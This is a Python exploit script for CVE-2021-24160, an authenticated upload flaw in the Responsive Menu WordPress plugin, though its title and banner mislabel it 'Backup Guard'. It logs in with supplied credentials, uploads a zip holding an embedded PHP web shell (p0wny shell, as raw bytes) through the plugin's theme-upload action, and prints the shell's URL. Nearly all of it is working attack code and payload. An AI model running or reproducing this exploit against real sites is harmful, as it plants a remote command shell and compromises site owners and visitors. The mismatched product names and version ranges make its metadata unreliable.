# Exploit Title: Wordpress Plugin Backup Guard < 1.6.0 - Remote Code Execution (Authenticated)
# Date 05.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://responsive.menu/
# Software Link: https://downloads.wordpress.org/plugin/responsive-menu.4.0.2.zip
# Version: 4.0.0 - 4.0.3
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24160
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24160/README.md

'''
Description:
In the Reponsive Menu (free and Pro) WordPress plugins before 4.0.4, subscribers could upload zip archives containing
malicious PHP files that would get extracted to the /rmp-menu/ directory.
These files could then be accessed via the front end of the site to trigger remote code execution and ultimately allow
an attacker to execute commands to further infect a WordPress site.
'''


'''
Banner:
'''
banner = """
  ______     _______     ____   ___ ____  _      ____  _  _   _  __    ___  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / |/ /_  / _ \ 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | '_ \| | | |
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| | (_) | |_| |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|\___/ \___/ 
               
                * Wordpress Plugin Backup Guard < 1.6.0 - RCE (Authenticated)                                                        
                * @Hacker5preme
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Responsive Menu 4.0 - 4.3.0 - RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Exploit:
'''
print('')
print('[*] Starting Exploit:')
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-post.php'

# Header (Exploit):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "application/json",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/edit.php?post_type=rmp_menu&page=themes',
    "Cache-Control": "no-cache",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "multipart/form-data; boundary=---------------------------12473561203192832341566500492",
    "Origin": "http://" + target_ip,
    "Connection": "close"
}

# Exploit Payload (Using p0wny shell: https://github.com/flozz/p0wny-shell)
body = "-----------------------------12473561203192832341566500492\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nrmp_upload_theme_file\r\n-----------------------------12473561203192832341566500492\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.zip\"\r\nContent-Type: application/zip\r\n\r\nPK\x03\x04\x14\x00\x08\x00\x08\x00\xef\xbb\xb9R\x00\x00\x00\x00\x00\x00\x00\x00TB\x00\x00\t\x00 \x00shell.phpUT\r\x00\x07\xb3l\xad`-\xe2\xe2`\xb3l\xad`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00\xc5\x1b\xffz\xdb\xb6\xf1?\x05\xcax\x11\xd5H\xa4l\xd7I+[r\x13\xdbY\xd2\xb9M\x16;\xdd\xf6Y\x9eF\x91\x90\xc4\x9a\"9\x92\xb2\xecU\xee\xb7\xa7\xd9\x83\xedIv\x07\x80\x14H\x82\x94\x94d\x1b\xd3J\"p\xb8\xdf8\x1c\x0e\xf0\xf1I8\rwv\xc6s\xdfN\xdc\xc0'cj%\xf3\x88^N\xa9\xe7\xe9\xbb\xf6\xcci\x91]{\xe14\xc9\xaf;\x04\x9e\xdd8q\x82yBz\xc4\x8a\"\xebAo\x1e\xed\xb0vwL\xf40\xa2\x93\xe1\xccJ\xec\xa9\xae\x99\x1d\xc4_\xdb\x0e|\xec\x9a\x1a\xa2\x989\xcd\x14\x07>\xa6IB+\x8e\xd9\xfb#\xa1^L+1<\xd3\x8dgM\xf8\xad\xef\xf7\x9f\xee5O\xd4\xf8\xec\xa9\xe3F:\xe3\xf4(k\xac@w\r?o\x94(\xe1\x93\x81K8\x04b\xd6|\xbdw#zjXv\x82\x85\xef\x05\x16R\xe2\x84\xbe\x0c\xeb\x12\xda\xed\x04\x88(\xd83\xb3\xeb\x99@S!\xd1:\xb6\xe8=\xb5S\xaf\xe0\x9e\x90\x0e\xe7n \x88q\xdf\xc8Fi\x1cT#\xbd~:\xac\xb5\xea\x04\n\xacgB\x13\xf8\xa97Y\x0f\xa0},{\xe5{\xec\x17<\xe6H\x95\x90\xa8\xc7\xbfq\xfdD\xdf\x1d\xbb\x1e\xfd\xc9\x9aQ\xee\xd9\xf0\x99<\x844E[\x12\x1b\x8d\xcc H\xafG\x1a zC6\x1e\xea\x02&\x83f\x07\xb3pB}\xd2\xb6I\x86_\xab\xd0li\xcc\xb8<fG\x064G\xaeo\x8e\xacx\x8a\xe8\x07\x1a6\x0f4\x01\xc9F\xc6\x00E\xefC/p\xa8\xae\r|p\x86\x18\xe7\xef03WS\x08\xa3\xb6O\x83\xe1h0\xf3\xb0\x9f\xad\x1a\x1b\xac<\x08A\xdf[\xc94\x8b\r\xd8\x00\x9c|\x8f\xdfC\xb0\xc4\xd0\x0e\xfc\x84\xfaI,\xc1JJ\xe5\xe0\xa0\xd5\xd7//.\xcfe\xad\xaa\xd9d\xacr\xf7a\xbc\xf2\xee\xc6kD\xe3\x07\t\x19\x07s\xdf!&\xfc\x06\x04\x96CB\x1a\xcd\xdc8\x06\xde\x8dF\xb3\x95G\x03\xf6m\x94\x9cN\x08\xad4Z\rK>\xd8\x8d!\x03\x13Q|\x91\xc4-\x90\xc5\xf6\x0c\xf4\xf97C\xea\xdbh3\x06_\xe6A\xa5\xfe\x8f!W~\x08\xd8[\\\xe5\xf9\x08]r\xe0\xdd1\xb3I\x10R?\x1d\xd6X\x8c\x1a9K|\x013\xbc\xf5\xef,\xcf\x05\xad\x03\x05n\x84E\xe4&\xf4\xcbZa\xccp\x02\xc3\xadT\x83\x0e\x954(E\xaa\xb1\xed\x051\xb6\x97C\xe1f\xf2\x9c\x05>\xfd\x04\x8e\xd1f\xa8S\x10\x99B\xac\x19\xfe\xfe\xfc\xeaZ\x13\xb6\xd3nX\xe0\xe7V\x89h\x1c\x06~\x8c\x13\xe6\xa7\x8f\x17\x17b\x1d\x8d\x17.\x84eR\x1e(Gf\x90\x1cb*\xcep\xad\x9bcO\x04\x8c\xdd\xe1\xfbw\x97W\xd7,X\xdd\x1c\xe5 \x90\xb5\xaf\xa4\xc5\xa5a\xee\xf7\xcd\x86bU\xca\xa14 \xf2\x11\\j\x1ayl\x8fy\xea\x92H\xaa4\x82s\xc5B\xf5M3\x8fh\x04\x13\xf6\xf6\xa8 a\x08\x80\xddu\x14\xd8\x92\xb0\x01\xb2)\x84\xfe\xf5\xd8\xf8\x02!\xd4\x87.\xc5\xe6\xf6Mk\xa5R\xb0\xbf\xf4\x8a\xebBc\x13a\x1as6o\x1bk9H\xe7\xb7 \x80\xb3I&\xc8\x02H\x91\x9f\xfc\x1a<\x85\xd8G#];\xe5\xc1\xb7}\x05<v\x89\x15\x86\x9ek[\x18J\xcc_\xe2\xc0\xd7\xc4 jO\x03\x82\rY,Jy\x12\x00\x8eKu\xbe\x12\x9c\xf4\x8f\xbf:{wz\xf5\x97\xf7\xe7d\x9a\xcc\xbc\xfe\xce\xce\xb1\xf8F\xc0c$\xdc\xcf\xe4;\x9e\xd1\xc4\x82hdE0\x11z\xda\xc7\xab\xd7\xedo5bJ\x00\x89\x9bx\xb4\x1fv\x16\xfe\xc3\xf7\xcc\x9b\xbb\xbf=96yk\x01\r\x9a\xa1\xa7\xdd\xb9t\x11\x06\x11$\x12ba\xe9i\x0b\xd7I\xa6=\x87\xde\xb96m\xb3\x97\x16q}7q-\xaf\x1d\xdb\x96G{{F'O6N\x1ed\x02Le \x05D\x94\xc0yP\xcc\x80\x99\x15M\\\xbfK:G\xa5\xae\xd0r\x1c\xd7\x9f(\xfbF\x96};\x89pI\xea\x92'\x07\x07\x07e\x08;\xf0\x82\x08:)\xa5\xe5\xce1H\xd8\x1e[3\xd7{\xe8\x92Y\xe0\x07qh\xd9\xb48\xfdr\xaf_w\xbb\xed\x05\x1d\xdd\xba\t\x88\x1e\x05\x9e7\xb2\xa2v\x12\x01\x1f\n\xa9FA\x04^\xd2\x8e,\xc7\x9d\xc7]\xf2mx_'B;\xe5\xf5\xe0\x10\xffm\xcd\x86\x82\x01f\xac\n\xc2S\xeaN\xa6\x89\xa2s#\x89\xa7\xf3\xd9\xe8\x13%N\xb1\x8d\x82\xfbv<\xb5 \xe9\xee\x82;\x81\x03\x93\x0e\xfc{\x1e\xde\x93h2\xb2\xf4N\x0b\xff\x19\x07\xcd\x8dt6\xb2\xf1_\xad O\x98\xff\xab\x98\x96\xbdh\xbfLpf\xdd\xb7S]v:*\xa1R\x07>\x84^b\xcd\x93\x00D\xc1/\x05\xf3\x92\xd8(\xf0\xe1J`\xc2\xffS\xca\xcc|5v\xff\x01af\xaf\x13&e\x00\xc7\x8dC\xcf\x02G\x1e{T\xc1 \xb6\xb6!k\xa1,\xd3\xe9\xe2\xc4\x98\xcf\xfc2\x1c\xe4\x17\x13\xbf\r\t\xc0\x0c\xec\x17'\xb0\x9c\xdb\xd3\r\xd4\xda\x16\xd1B\xa1\xde\xd4\xd1\x0e\xd5\x9a\x0b\xeeh4\xf6P\x1bj}e\xf3\xffP5z1\x05V\xdbl\xdevqC\xd7^DVX!=\xd8\x18\xa8\xecm\"\x8d\x17L\x02\x85(\xcc\x08\x0b!\xcf(\xf0\x9c\xea\x80\xf3\xfa\xf57{\xdf*BVB\xef\x936S2\xd8\x00\x14F\xa3Z~\xbe\x9fQ\xc7\xb5\x88.y\xe0w\xdf\xed\x85\xf7\xaa4\xa2\x9e\xf7\x8c\xeeD\xcfU\xda\xc4'\xf5\xe4\xf6>z\xa6B\x82\x02\x87\xf8\xacb{\xabz\x9a1@\xa1\xbb\xbdN\xe7wj\xf2B\xc8j\x00I\x13>\xa4\x8f\x1b\xf1W\xcb\x13\x17\xb8\x9d\x04\xa1r\x8dy\xdc\xd2</\x9e\xbf\xa85\x8f\xeb\x87s\xd54\xc1g\xd3I\xba-O\x07\xfb\x9d/\xe02\xca\tX\xcb\x8a\xc1\xd1\x87\x11\xec\xc2U2o1\x9f^\x1c\x9e\xbd\xee\xbc\xaa\x9d+yj}\x02Q\xc1W\x10M1\xee\xbd:\xfd\xee\xfc\xc5&\xd1\xa0\xcadkBn>\xd2\xb7\xf7p:m\x12\xea\xc5\"\xca\x1c\x92\x81\xef\x1f\x1e\xb6\xc8\xea\xc3\xe8\x1c6I\x1c\xe0Fpo\xcd\xe2\x9d\x13\xa0O<kDU\xd3@\n\x8f\x8a\x19\x90\x899\xf2\x02\xfb\xb6\xdc\xbf\xca\xd0\xd4.\x92N\xfa\x03e\xfc\xf7\\\x9f\xb6\xabA\xea\x04J\x97\x1e\xd8=U/;\x9fD\x15\x1fn\x86\xaa(#'\r\x90\xff\xf9\xe0l\x11\x84\xf3\xffB\x06\x9a\xc1\xd5\xad\xfe\xb5a\x93\xaf\xe91\xf5\xc6\x1b\xad99\x1d;\xee]\xbd\xc3\xecU\xd1\xdb>\x87\xe0\x14\xabf[0O\xd0j*\x83\xac\x82\xd0\xb1)\xb6\x1e\xd2^\xc4\x8e\xdc0\xc9oF\xee ]>\xfd\xd3\x19l\t\xfd\xb9\xe7\x1d\x95\xfa\xec`6\xb3|\xe7\x8d\x1b'A\xf4\x00`\xd77e\xa0)\xef}\x1f\xc4.\xab\x1e\xf5\x8a\x93\x07\x81\xf8\xf6\xfct\xe6\xbcebU\x11\x14`\"\x89J\xa1r`Y\x95j\x88\xd9r\x94\x9cr\x1eu\xc1\xab*\xbc\xe7\xb0\x1a\xae\xef\xd3\xe8\xcd\xd5\x8f\x17\xe4Y\x8fh\x03\xe0ke\xdb\xd5\x0ci\x1c\xb3\x88j{V\x1c\xf7\x06\x9a\x1cm\x07Z\xbfA\x9e\x91\t\xf5\xdf\xb3w\x1d\x94\xdb\x84\x86\x06\xd8\x03\xc6\xf4Ic+J\x14\xb6\x95!}\x03YE&\xddV\xe3\xb5\rD\xe3\x9b\x99\xab \xc4\xba\xae\xa2\xe7\r\x0b\x0e\xb5n[\xb4\xc8%+p\xe9\xa2h\xbf\x9d=$\x91sE\xff\xff\x91\x00\x0e\x1d\xd3H\x87\xcd\xbc\x87\x81M\xc5;l\xd0\xae\xdc\x19E\x01S0X\xc2\x9a\x9b\xe1\xcf\x95\xaa$\x87-Q\xa9\xf0\xed\xb2.\xb0\xc8\xc6\x0emx\xd1G>\t\xda5\x8d\x84\xc6I6X%\r\xe3.W\r\x12\xd0\x06\xaf\xd9\xe5QK\xa7A\xbbfsu\xa0\x93\x13\x9d\xd7Q3\xbel\x8fZ\xd1\x16\xdc\x98&y\x05:\xa5\xbe\xc3\x0f\x16\xc8\xd5\xf9\x87\x1f\t\xf5\xef\xdc(\xf0g\x18\x15 N\xb8\xd6H\x14\xe2\xc1\x1c\x069E\x1ai\xb0J\xe3\x11\x19\xc3\x14$\x1f\xdf\x92\x11\xc4\x9b[JC\x88\xa8\xf0{\x0c\x06V\x12\xaerJ\x98\xf0\x8aY[*\x17\xcb\xcf\xcc\xba\xa5\x1f\xe8\xdf\xe7(\xafv\"\xf4\xdb\xe3U\xd4\x16\xf9\x15\x16\xean\xcam\x8b\xd8\x0bx\x838\xf1\xd8Z\xf9\x89\x9e\x15\xc6*(\xa4\xa6O\xe1\x8c\xa9\x15\xbf[`\xd4\t\xc1m\x1et^\xbc\xabTr\xfa\x14\xcfY2t>;\xb3\xca^\xf3g\x06[\xe9\"}\xf2\xb1!\xc3\xcc'\xb9\xf1K\xe0\xfa\xec8\xa9\xa9p)\xf9\x99\x87\x8e\x95\xd0\xd3\x85\xc4k\xfe\xd8\xb0\xc4\x9c\xb2\xe7Q\xe5\xb9\xdbLaV\xbdU\xa9\x17\xad\x92_\xec\x8c;\xcb\x9bS#\x89\xdc\x99\xde4<\xeaO\x92);\x04\xe94\xc51\xc1\x11s\xfb\xb1K=\x87\xb81\xa1\xb0r<\x90v\x1f\x1d|\n\x19%I\x02t\x97\xd0\xa3\t-\x87\x8aU\xf0\x8a\xb8\xcb\x9d\x8a\xb0\xa4\x83\xa6\xac*\x0f@6\xb1\x9f\x996N\xb9:\xee\x91\xbd<S~F\x1aH\x94\x89W\xa3B\x01\xf7\xd7\xb9\xaf8\xebT\x1cv\xaa\x1e\x95Zaz\xaeh_wnj\x1ca\x13/eI\xcf<\xc2\x14\xf6g\x81^E\xb5\xdeG+\xf8\x94\xf1\x1a\x11\x85\xbd\x84Mu\x93\xc7\xd4\xaf\x9b\xbbf+/\xc9\xf6>\xbdN\xc0\xc2\xa2\xa2b\xb3\x86h~\x02K\x06_;w\xcb\xec*j\x13\x92\xe6O\xd9\xc9\x92r\x12\xc1\x0e\xcc\x85\x98J4\x05)\xc4\xc0\x1d\x8a\xe8+L\xb2?\x82o\x9f\x10\r\\M#]\xa2!\xf7\x8a\xf4\x08\xd1\xa4G\xe4\x88*\xf3Q6\x101\xac\x90\x83\x99\x00\x93\xf4^\xa6\xdb&{7Geq\xe5%B\xa9\xb4\xd5\xba\xc1\x8e\x93ZJ\xa0j[\xa7\x07J\xddL\x165\x06|\xd2\x15\xa8\x1a\"a\xe7:\xf8\xa96\xb0zd1 \x95\x80\x9a\x05\xc5\xac\x89\xb9\xd92\xc5W'\xb6()T\xc0\xf6\x11\x1e\x9d\xf1\x1d\x84\x13\xd8s\xfci\xd8\x11`\xa1\xe7\xbcCoX\rUf\xc9{\r\xc8*^&\x10\xb0!u\xa0zc\x1a\xd1q\xa3E\x1a\xe8\xf3]\xf9p+\xb0\x13\n\xfbQ\xd8\xd9Y\xb3#~H\xdc\xc2\xfc\x9fq\xb6)\xf6\xf4\xb6\rP@\xb9\xea\xc6\xe1\x96\xce\x10e\x08\xccKp\x07\xa8\xc8M2\x91\xb1\x12i\x00\xc3\x90L\x9dN]\x0f\xa6<\xc7TC\xc3\x06\xe1n\x8b\xa7\x9ce\xa4\x11\x9d\x05wt\x1d\xd2|\xc8H\x8f\xb9\xb7J\x95EV\x1aJw?\xe4g3[\xb3\xad\xf4\xe6\xf6f'\xad-q\x83\xe2\xffl\x0f\xcbq\xce\xef\xe0\xc7\x05$\xb5\x14RR\xbdaO-\x82\xfc\xad\xb2\xc5\xaa\x85\x13\xb5\x83\x1bS\x97\x9d\xfaNh\xf2\x8a\xf9hJv\xddR#\x86\x1a\xc9\x94\xfa\xfa\x8aZ\xd5\xbcK\x1f9\xb45\xb2(&\x0e\xa5!\xfdE[v\t\xbf\x1d\x82\xb8x\x88\xfa\x8cD\x18\x9f\xff[zY\xb5\xe6mb\x9f2\xe3\x8d\x97>\x99\xfb\xb7>\xc4\x04\x02S\x91\xb2r\x97C\t\x8d\xa2 \"\x81\xcd\xd6\x17\xa74\x89\xea\xb8Q\xb5}\xf1\xd9^5\x8bW>\xc7m\x1c\xf8\x17\xe0\x05\xa75\xfbkqq\xc6\xa7\x0b\xf2\x9e\xfb_\xe6zh\x93\xc0\xbbc\x1b\x93_\xa8\xad,-\xe0\x83n\x1f\xb1\x9b\tXA\x02Dxm\xeb\x03\xbf\xaaP\xa18\x0en\x04,\x12\xe3\r\x89\x94$\xd0 \x82\xac.\x80\xe0u\xee%\xe9\x06Y\x84}\xdd\xc0\x14\x8e\xef\x89\xc9\xe3\x1a\"\xdc\x9a=!F-0~\xbd\x8c\xcf`\xe5\xf9\xf8\xe1B\xafXX\x8a&\xae\xb6FZ\x97\x92.q\xc9\x0f4c\xa2\n\x9f\xcb%\xd1~\xab\xc8\x8e\xe2i\x00Yd\n\xaa\xaeI@G\x9a\xac\x99Z\xb6\xeb\xe9\x93\x83:\xa3\xb1\x01\tu2\xdc\x12\n\xb5\x96$V\xb4\xff\xf3_\xa6\x06\xab\xaf\x84\xe5Z\xfa-xh\xef\xdf\x00\x8c\xb6\t\xe4\x9eb7Q\xcee\x85\xc3j\xf2\xe5\x12^!d\xd7Kz\x03\rI\xa1N\x81\xec@\xeb3\xc2)\xdb\xd0$J\x83O\xb4\xcdl\xb8\x8aP\x156\x14\xda\xaf\xd23/\xf7*\xed\x86\xcf\x90\xe3\x17nR9[\xd8\x06q\x03\xe5\xa8+!x\xdb\n\x16\x02)F\xae\x8d\xf3\x9cm9(\"\xff\x8f\x9b&\x9d\xb9Jd\x04\xdb\xf0\x9ah\xc5\x01\x94\x0c\xadvzO\xcdI\x8bhO\xadYx\xa4\xa9\x8b)+\xd8c\x0e\xeb%\xebA\xfb\x1ct\x82\xa0\x1bV9\xf3:\xaaJ\xab\xd8\xfe\x8b\x03\xc9\xb9\x15\x84t\x91X\xbdzx\xeb\xe8\xb9\xfa\xb7j\x9a\xcaxre\xb5|\x95|C\xd6\x03?\xdd\x16\xfe\x81>\xe0\x86@\xa7\x98\x1e)+\xb5\xe2~#\x030n\xe9C\x95o\xf1[{\xe7x T\xb8\xb6\x97\xe3A\xae\xddn\xb9w\xe6k\xfcU \x0eR\xb6\x1d^QP\xd0\x14\xf19}\n\x17\x03\xcb\xe2\xbe\x845h\xf11\xac\x11\x18\x03I\xf1l\xa7\x8fE\xab\xfaL\xac0\xa4\xdd\xde\xaaX2\xf2\xe6\x95\x8bt\xc5\x90\xac\xbe\x92;\xac\xba.\xf0QS\x19\xc2GT\xfe\xe5u\xbf\x16^\xc1\xc7\x18fH\xbc\x8e\xf7\xaa|\x91\xf5}\xa65q:lk\xcf\xa2\xda\xc4\xda\xb7N\xfc\x1a\x86\xea%)0\xf0\xecY\xcd\xa4Q\xf0\x8bu\x98Ob\xf8\x13\xa6\xd0F\x05\xc3\xcfw\xdf\x8d\xdc\xe6K\xbb\xfc\xa7\xbbZ\xe3\xca\x1a5\xaa\x9d\x8c\x07\xdb0b\xdfgtlA\xaa\\'\\\xae\x9c\xbeu8\xdb\xacd_\x8c\xbex\xff\\y!&\xe7W\xe1<\x9e2\xd02\xd9\xf2\x89\xb7\xd2'7[\xd2\xe4\x14i\x1ey-\xd8\x19G\xd6,\x86\xfdp\xcd.I\xde`\xfdqN\xa3\x87K\x96\x81\xd4V\x02,\xc5\xf9}\x86\x0f\xf6#:\x02\xc12\x89\xe7d\x9c\x87u\xe5{\x0eU<{\xc2\x95v\xddt\xb4\xb8z\xf9=\xf0\x8f\x1f\xde\x9eB\x1e\x00\xfb\"p\x02\xb6NCZ\xdc\xc3<Y\xd1\xcfi^\x03\xd8M\xddf\xbe\xa2D^\x93\xce\x02O\xbcL\xf0T\x95\xc5\x94G\xa2\xb6\xee\xa7\xe9\x16\xf3\xcf?^\xbcI\x9205\xa4\x02\x03\xc0\x1a\xec\x0fc4\xbcN\x0f\xf9/3v\x12)W~\x04\x8ei\"\xd0\xbdQ\\\xb3\x07\x04\x9a\\\x8b\xbco/\x16\x8b6\xd8q\xd6\x06\xc4\\q\x8eJ\x12\xc6\x87\x8f\xfb\xca\x878\x814\x90\xd7\x93\n{^\xa5\x9e\xd0\xe48\x9a\x8d\xbd\xc4\xb1,\x1eC\x9e>\xe5\x0cC\xd3<\xe6'?\x9d\xda<!\x89T\xb7\xdf\x8b\xdaM\xb3\xfd\x1fb6\xc7~\xb8|\xf7\x93\x11\xe2\x1d\xc1\x05\xef\xbd\xa2\xf7\xaa\x02\x9a\xfc\xa43I\x971\xd69\x0f\x8c\xe0\xa9#n\xd4\xd7\xfa\xb2\x07n\xafk\xe7lS\xbf\x98\xe2\x9f\x88!\x97xp\x97\xd2\xeb\x12\xe6\xcd\x0c\xdb\xe7\xfb\xac\xa2\xbc\xc0\xfd\xc5w\xf4b<\xa8\xcf\xab\xb3\xa4>\xf0Y)H\xf6\x82\xca\xbc\x9au\xe0\x01\r\xfb^.\xc9\xc2\xf5\x9d`a\xb0\xf7\x8a\x8a\x01\xf5\xf8]N\x18&\xa0\x81\xd1\xcb\xb4U5]\xd8i\x8e\x15\x01XJ\xca\x10\xaf@\x91\xbf\xc7\x91-v\"\x8a\x03\x16v\xbc\xc8\x06\xc0\xb8\t?\xcc\xc1C\x9c\xcb\xf3\x8b\xf3\xd3+\xad\xca\xa8\xd5[[%\x85\xaf2\xc9\x8c$\xc8t^\x81{\xd3\x85\xbf\xb0\xaa\x15\x84\x13\xfaS\x96\xaa*6_\xd2\xb5\xab5\xdb8v\xc4U\xb5\x87[]\xcbZ\x87\x85\x03\xaa0\xad\xca\x17\xd5dj\x15$9\xff\xb1)\xdfi;6\xf9\x1f\x05\xf1\x17\xac[J\x88\x83\xd7\xf7\\\xa7'\xfe\x92-\t\xee\x18\xb2\x95Ug\xc6|\xbf\xc4^\x1e\x0b\xbb-,A\r\x87\xc3\xe2\x00\"\xf5\x89N\tf\xb8z\x19\xf2\x0eV6\xea\x8b\x82\xd0\x0e\x02@\xab\t\xdf\x83l\xf8\x907\x0e\xf9 \x13_\x06\xd8\xba$K\x06\xc3\xc2\x0b1\x07&\xcc\x94%\xfb\x9dG\xbc$\r\x18\xc5\xc0`\xf0\x00 \x01\x91)5.\xf1u\xf87\x86\x9e\x03s.\xa0K\x1f6\x011P2\x0c \xb6,\"^\x0e\x9b\x8c:\xfc? ?\x13\xf8\xcf\x14(y#\xc3\xb0d\xf2\x0cD;\xd009\xc7\x84\x10\x15b\x03\xa1`\x18|\xc2\x979\xc01L\xe8%4\xb6\x90\x1a~\x0f\x97\x08\x91\xb5\xc3\xebr\x08\x1c\x13\x86z\x89\x03\x8a\xaa\xc0\xa6\x8ag\x99R\xe3\xdf\xeb\x9e\x82\xf1\x8a\xbd&8O\xc1\xefLp\xbcBS\xde\xc3\xd8\xb9\x95\xca\x11\xf9\x05fX\xec{\xd2\xbc\x95\x06\x8aj\x8c\xb8\xa3\x98o\xec\x9f\x9c\x9c\x1c\x9b\x0c\x83\xda\xc5\xcb\xad\xacG\xdcJur$\xf9\x1f\xcb\xb1\x9f\x81\x0f9\x19\x1ef\xf6\xb4\xca*\x8dfn\xa8\x99\\\x93\xf4zl\xf2\x89\xbd\x03\xb3\x9d\xfd9\xe0\x00PK\x07\x08\xad;\xa6\xce\xde\x0f\x00\x00TB\x00\x00PK\x01\x02\x14\x03\x14\x00\x08\x00\x08\x00\xef\xbb\xb9R\xad;\xa6\xce\xde\x0f\x00\x00TB\x00\x00\t\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00shell.phpUT\r\x00\x07\xb3l\xad`-\xe2\xe2`\xb3l\xad`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00W\x00\x00\x005\x10\x00\x00\x00\x00\r\n-----------------------------12473561203192832341566500492--\r\n"
session.post(exploit_url, headers=header, data=body)
print('[+] Exploit done !')
print(' -> Webshell uploaded to: http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/rmp-menu/themes/shell.php')
print('')